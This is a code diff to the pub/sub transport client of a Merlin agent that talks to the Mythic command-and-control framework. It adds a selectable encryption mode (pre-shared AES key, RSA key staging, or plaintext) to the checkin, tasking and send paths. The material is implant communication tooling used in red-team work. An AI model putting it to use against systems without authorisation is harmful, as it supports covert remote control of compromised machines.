@@ -51,8 +51,9 @@ type PubSubClient struct {
 	mu          sync.Mutex
 	running     bool
 
-	// AES encryption - key comes from either PSK (build time) or RSA staging (runtime)
-	psk             []byte // 32-byte AES key
+	// Encryption settings
+	encryptionMode  string // "aes256_hmac", "rsa", or "none"
+	psk             []byte // 32-byte AES key (nil for plaintext mode)
 	initialChan     chan map[string]interface{}
 	checkinDone     bool
 	listenerStarted bool
@@ -61,8 +62,8 @@ type PubSubClient struct {
 
 // NewPubSubClient creates a new pub/sub client for Merlin.
 // pskB64 is the base64-encoded 32-byte AES key from Mythic's AESPSK parameter.
-// If pskB64 is empty, the client will perform RSA key exchange staging to obtain the key.
-func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient, error) {
+// encMode determines encryption: "aes256_hmac" (use PSK), "rsa" (RSA key exchange), "none" (plaintext).
+func NewPubSubClient(cfg *Config, agentID string, pskB64 string, encMode string) (*PubSubClient, error) {
 	instanceID := uuid.New().String()
 
 	if core.Verbose {
@@ -70,9 +71,17 @@ func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient,
 		color.Cyan(fmt.Sprintf("[*] Subscription will be: mythic-tasks-sub-%s", instanceID))
 	}
 
-	// Decode PSK if provided
+	// Handle encryption mode
 	var pskKey []byte
-	if pskB64 != "" {
+	if encMode == "" {
+		encMode = "aes256_hmac" // Default to PSK mode for backward compatibility
+	}
+
+	switch encMode {
+	case "aes256_hmac":
+		if pskB64 == "" {
+			return nil, fmt.Errorf("PSK required for aes256_hmac mode but not provided")
+		}
 		var err error
 		pskKey, err = base64.StdEncoding.DecodeString(pskB64)
 		if err != nil {
@@ -84,10 +93,16 @@ func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient,
 		if core.Verbose {
 			color.Green("[+] AES-256 PSK loaded successfully (static PSK mode)")
 		}
-	} else {
+	case "rsa":
 		if core.Verbose {
-			color.Yellow("[*] No PSK configured — will perform RSA key exchange staging")
+			color.Cyan("[*] RSA key exchange mode — will perform staging to obtain AES key")
 		}
+	case "none":
+		if core.Verbose {
+			color.Yellow("[*] Plaintext mode — NO ENCRYPTION (for testing only)")
+		}
+	default:
+		return nil, fmt.Errorf("unknown encryption mode: %s", encMode)
 	}
 
 	transport, err := NewTransport(cfg, instanceID, agentID)
@@ -96,15 +111,16 @@ func NewPubSubClient(cfg *Config, agentID string, pskB64 string) (*PubSubClient,
 	}
 
 	client := &PubSubClient{
-		transport:   transport,
-		agentID:     agentID,
-		payloadUUID: agentID,
-		instanceID:  instanceID,
-		config:      make(map[string]interface{}),
-		messages:    make(chan interface{}, 100),
-		pendingJobs: make([]messages.Base, 0),
-		running:     false,
-		psk:         pskKey,
+		transport:      transport,
+		agentID:        agentID,
+		payloadUUID:    agentID,
+		instanceID:     instanceID,
+		config:         make(map[string]interface{}),
+		messages:       make(chan interface{}, 100),
+		pendingJobs:    make([]messages.Base, 0),
+		running:        false,
+		encryptionMode: encMode,
+		psk:            pskKey,
 	}
 
 	return client, nil
@@ -170,8 +186,13 @@ func (p *PubSubClient) Initial() error {
 		}()
 	}
 
-	// If no PSK, perform RSA key exchange staging first
-	if p.psk == nil {
+	// Handle encryption based on mode
+	switch p.encryptionMode {
+	case "aes256_hmac":
+		if core.Verbose {
+			color.Cyan("[*] Using static PSK for encryption")
+		}
+	case "rsa":
 		if core.Verbose {
 			color.Cyan("[*] Starting RSA key exchange staging...")
 		}
@@ -182,9 +203,9 @@ func (p *PubSubClient) Initial() error {
 		if core.Verbose {
 			color.Green("[+] RSA staging complete — AES key obtained")
 		}
-	} else {
+	case "none":
 		if core.Verbose {
-			color.Cyan("[*] Using static PSK for encryption")
+			color.Yellow("[*] Plaintext mode — skipping encryption setup")
 		}
 	}
 
@@ -231,22 +252,31 @@ func (p *PubSubClient) Initial() error {
 
 	// Determine which UUID to use for the frame
 	// - RSA staging mode: use stagingUUID (so Mythic can find the encryption key)
-	// - PSK mode: use agentID (payload UUID, Mythic looks up PSK from payload)
+	// - PSK/plaintext mode: use agentID (payload UUID)
 	frameUUID := p.agentID
 	if p.stagingUUID != "" {
 		frameUUID = p.stagingUUID
 	}
 
-	if core.Verbose {
-		color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin (frame UUID: %s, body UUID: %s)", frameUUID, p.agentID))
+	// Build Mythic frame based on encryption mode
+	var frame string
+	if p.encryptionMode == "none" {
+		// Plaintext mode - no encryption
+		if core.Verbose {
+			color.Yellow(fmt.Sprintf("[*] Sending plaintext checkin (frame UUID: %s)", frameUUID))
+		}
+		frame = buildMythicFrame(frameUUID, checkinJSON)
+	} else {
+		// Encrypted mode (aes256_hmac or rsa)
+		if core.Verbose {
+			color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin (frame UUID: %s, body UUID: %s)", frameUUID, p.agentID))
+		}
+		encrypted, err := aesEncrypt(p.psk, checkinJSON)
+		if err != nil {
+			return fmt.Errorf("failed to AES-encrypt checkin: %w", err)
+		}
+		frame = buildMythicFrame(frameUUID, encrypted)
 	}
-
-	// Build Mythic frame: base64(frameUUID + encrypted body)
-	encrypted, err := aesEncrypt(p.psk, checkinJSON)
-	if err != nil {
-		return fmt.Errorf("failed to AES-encrypt checkin: %w", err)
-	}
-	frame := buildMythicFrame(frameUUID, encrypted)
 
 	// Send
 	if err := p.transport.SendRaw(frame); err != nil {
@@ -273,14 +303,21 @@ func (p *PubSubClient) Initial() error {
 		return fmt.Errorf("failed to parse checkin response frame: %w", err)
 	}
 
-	// Decrypt response
-	plaintext, err := aesDecrypt(p.psk, body)
-	if err != nil {
-		return fmt.Errorf("failed to AES-decrypt checkin response: %w", err)
-	}
-
-	if core.Debug {
-		color.Yellow(fmt.Sprintf("[DEBUG] Decrypted checkin response: %s", string(plaintext)))
+	// Decrypt response (skip for plaintext mode)
+	var plaintext []byte
+	if p.encryptionMode == "none" {
+		plaintext = body
+		if core.Debug {
+			color.Yellow(fmt.Sprintf("[DEBUG] Plaintext checkin response: %s", string(plaintext)))
+		}
+	} else {
+		plaintext, err = aesDecrypt(p.psk, body)
+		if err != nil {
+			return fmt.Errorf("failed to AES-decrypt checkin response: %w", err)
+		}
+		if core.Debug {
+			color.Yellow(fmt.Sprintf("[DEBUG] Decrypted checkin response: %s", string(plaintext)))
+		}
 	}
 
 	// Parse JSON to extract callback UUID
@@ -578,9 +615,11 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 					continue
 				}
 
-				// Decrypt
+				// Decrypt (skip for plaintext mode)
 				var plaintext []byte
-				if p.psk != nil {
+				if p.encryptionMode == "none" {
+					plaintext = body
+				} else if p.psk != nil {
 					plaintext, err = aesDecrypt(p.psk, body)
 					if err != nil {
 						if core.Verbose {
@@ -589,7 +628,10 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 						continue
 					}
 				} else {
-					plaintext = body
+					if core.Verbose {
+						color.Red("[-] No encryption key available but encryption mode is not 'none'")
+					}
+					continue
 				}
 
 				// Parse JSON
@@ -640,7 +682,7 @@ func (p *PubSubClient) Listen() ([]messages.Base, error) {
 	return pendingJobs, nil
 }
 
-// Send sends a Merlin message to Mythic, AES-encrypted and framed.
+// Send sends a Merlin message to Mythic, encrypted (or plaintext) and framed.
 func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
 	if core.Debug {
 		color.Yellow(fmt.Sprintf("[DEBUG] Sending message: %v", message))
@@ -655,16 +697,20 @@ func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
 		return nil, fmt.Errorf("failed to marshal message: %w", err)
 	}
 
-	// Build Mythic frame: base64(callbackUUID + [encrypted] body)
+	// Build Mythic frame based on encryption mode
 	var frame string
-	if p.psk != nil {
+	if p.encryptionMode == "none" {
+		// Plaintext mode
+		frame = buildMythicFrame(p.agentID, jsonBody)
+	} else if p.psk != nil {
+		// Encrypted mode (aes256_hmac or rsa)
 		encrypted, err := aesEncrypt(p.psk, jsonBody)
 		if err != nil {
 			return nil, fmt.Errorf("failed to AES-encrypt message: %w", err)
 		}
 		frame = buildMythicFrame(p.agentID, encrypted)
 	} else {
-		frame = buildMythicFrame(p.agentID, jsonBody)
+		return nil, fmt.Errorf("no encryption key available for mode: %s", p.encryptionMode)
 	}
 
 	// Send via transport
@@ -672,8 +718,14 @@ func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
 		return nil, fmt.Errorf("failed to send: %w", err)
 	}
 
-	if core.Verbose {
-		color.Green("[+] Encrypted message sent successfully")
+	if p.encryptionMode == "none" {
+		if core.Verbose {
+			color.Yellow("[+] Plaintext message sent")
+		}
+	} else {
+		if core.Verbose {
+			color.Green("[+] Encrypted message sent successfully")
+		}
 	}
 
 	return []messages.Base{}, nil
